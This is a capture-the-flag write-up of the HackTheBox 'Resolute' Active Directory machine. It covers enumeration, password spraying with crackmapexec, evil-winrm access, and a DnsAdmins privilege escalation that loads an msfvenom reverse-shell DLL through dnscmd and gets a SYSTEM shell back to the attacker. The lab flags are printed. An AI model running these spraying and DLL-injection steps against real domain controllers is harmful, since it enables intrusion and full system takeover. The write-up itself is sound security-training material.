---
title: "Resolute"
date: 2025-06-20
categories:
  - HackTheBox
  - Active Directory
  - Windows
tags:
  - HackTheBox
  - Active Directory
---

# Resolute

![](assets/Pasted%20image%2020250510160806.png)
<!-- more -->

## Enumeration

```bash
$ nmap -sC -sV -Pn -T4 --min-rate 1000 -p- 10.10.10.169
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-20 21:00 CET
Nmap scan report for 10.10.10.169
Host is up (0.045s latency).
Not shown: 65512 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
53/tcp    open  tcpwrapped
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-11-20 19:56:04Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49688/tcp open  msrpc        Microsoft Windows RPC
49819/tcp open  tcpwrapped
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-11-20T19:56:56
|_  start_date: 2024-11-20T19:51:31
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2024-11-20T11:56:55-08:00
|_clock-skew: mean: 2h34m33s, deviation: 4h37m10s, median: -5m27s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.75 seconds
```

Add `megabank.local` to `/etc/hosts`

We find a password hardcoded in the description of a user using `enum4linux-ng`

```bash
=====================================
|    Users via RPC on 10.10.10.169    |
 =====================================
[*] Enumerating users via 'querydispinfo'
[+] Found 27 user(s) via 'querydispinfo'
[*] Enumerating users via 'enumdomusers'
[+] Found 27 user(s) via 'enumdomusers'
[+] After merging user results we have 27 user(s) total:
'10101':                                                                                        
  username: melanie                                                                             
  name: (null)                                                                                  
  acb: '0x00000010'                                                                             
  description: (null)                                                                           
'10102':                                                                                        
  username: zach                                                                                
  name: (null)                                                                                  
  acb: '0x00000010'                                                                             
  description: (null)                                                                           
'10103':                                                                                        
  username: simon                                                                               
  name: (null)                                                                                  
  acb: '0x00000010'                                                                             
  description: (null)                                                                           
'10104':                                                                                        
  username: naoki                                                                               
  name: (null)                                                                                  
  acb: '0x00000010'                                                                             
  description: (null)                                                                           
'1105':                                                                                         
  username: ryan                                                                                
  name: Ryan Bertrand                                                                           
  acb: '0x00000210'                                                                             
  description: (null)                                                                           
'1111':                                                                                         
  username: marko                                                                               
  name: Marko Novak                                                                             
  acb: '0x00000210'                                                                             
  description: Account created. Password set to Welcome123!                                     
'500':                                                      
```

We have `marko:Welcome123!`

Check the password with all users and we find `melanie:Welcome123!`

```bash
$ crackmapexec smb 10.10.10.169 -u users2 -p 'Welcome123!' 

SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Administrator:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Guest:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\krbtgt:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\DefaultAccount:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\ryan:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\sunita:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\abigail:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\marcus:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\sally:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\fred:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\angela:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\felicia:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\gustavo:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\ulf:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\stevie:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\claire:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\paulo:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\steve:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\annette:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\annika:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\per:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\claude:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\melanie:Welcome123!
```

## Initial Access

Enter the host using `evil-winrm`

```bash
$ evil-winrm -u melanie -p 'Welcome123!' -i 10.10.10.169
                                        
Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\melanie\Documents>
```

Get the flag

```shell
*Evil-WinRM* PS C:\Users\melanie\Desktop> type user.txt
2cbc3d50e90f2717a55d2204fa02626c
```

## Privilege Escalation

While enumerating the filesystem, I found a PowerShell history file in  
`C:\PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt`

Make it visible before downloading it or `evil-winrm` will fail

```bash
attrib -h C:\PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
```

```bash
$ cat aaa.txt       
**********************
...
**********************
PS>ParameterBinding(Out-String): name="InputObject"; value="PS megabank\ryan@RESOLUTE Documents> "
PS megabank\ryan@RESOLUTE Documents>
**********************
Command start time: 20191203063515
**********************
PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
...
```

So `ryan:Serv3r4Admin4cc123!`

Test it with `cme`

```bash
$ crackmapexec smb 10.10.10.169 -u 'ryan' -p 'Serv3r4Admin4cc123!'
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\ryan:Serv3r4Admin4cc123! (Pwn3d!)
```

We can see the permissions of this user

```bash
*Evil-WinRM* PS C:\Windows\System32> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ===============================================================
...
MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
```

We can see that this user belongs to the `DnsAdmins` group. This group can execute and manage DNS on the DC.  
[https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/](https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/)  
So we can search for the program in `system32` called `dnscmd.exe`.

Also, there is a note on his desktop:

```bash
cat note.txt
Email to team:

- due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within 1 minute
```

With `dnscmd.exe` we can load a DLL plugin that is a reverse shell.

So, create the shell

```bash
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9090 -f dll -o reverse.dll
```

Start an SMB share and start a listener.

```bash
$ impacket-smbserver s .
```

Now execute the setting of the DLL and stop and start the service for the program to load it.

```bash
*Evil-WinRM* PS C:\Users\ryan\Documents> dnscmd.exe 127.0.0.1 /config /serverlevelplugindll \\10.10.14.11\s\reverse.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.

*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe stop dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x1
        WAIT_HINT          : 0x7530
*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 2652
        FLAGS              :
```

And we have a shell

```bash
$ rlwrap nc -lnvp 9090                                        
listening on [any] 9090 ...
connect to [10.10.14.11] from (UNKNOWN) [10.10.10.169] 51688
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

## Post Exploitation

Get the flag

```shell
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
49b3587c718bba01ab71f2d2e7142648
```
